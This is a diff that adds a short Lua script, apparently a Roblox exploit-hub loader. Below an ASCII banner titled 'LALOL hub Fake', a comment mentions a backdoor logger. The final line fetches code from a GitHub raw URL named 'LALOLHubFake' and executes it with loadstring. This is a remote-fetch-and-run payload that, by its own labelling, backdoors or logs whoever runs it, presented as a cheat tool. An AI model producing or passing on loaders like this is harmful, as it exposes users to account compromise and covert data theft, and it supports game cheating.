@@ -1,0 +1,12 @@
+--[[ 
+      .____       _____  .____    ________  .____       .__         ___.     ___________       __           
+|    |     /  _  \ |    |   \_____  \ |    |      |  |__  __ _\_ |__   \_   _____/____  |  | __ ____  
+|    |    /  /_\  \|    |    /   |   \|    |      |  |  \|  |  \ __ \   |    __) \__  \ |  |/ // __ \ 
+|    |___/    |    \    |___/    |    \    |___   |   Y  \  |  / \_\ \  |     \   / __ \|    <\  ___/ 
+|_______ \____|__  /_______ \_______  /_______ \  |___|  /____/|___  /  \___  /  (____  /__|_ \\___  >
+        \/       \/        \/       \/        \/       \/          \/       \/        \/     \/    \/ 
+
+@Watup_Exploitz|To Disable Logger, use _G.LALOL_Hub_Backdoor_Logs_Disabled=true|
+]]
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sakha567/WatupProject/refs/heads/main/LALOLHubFake'))()
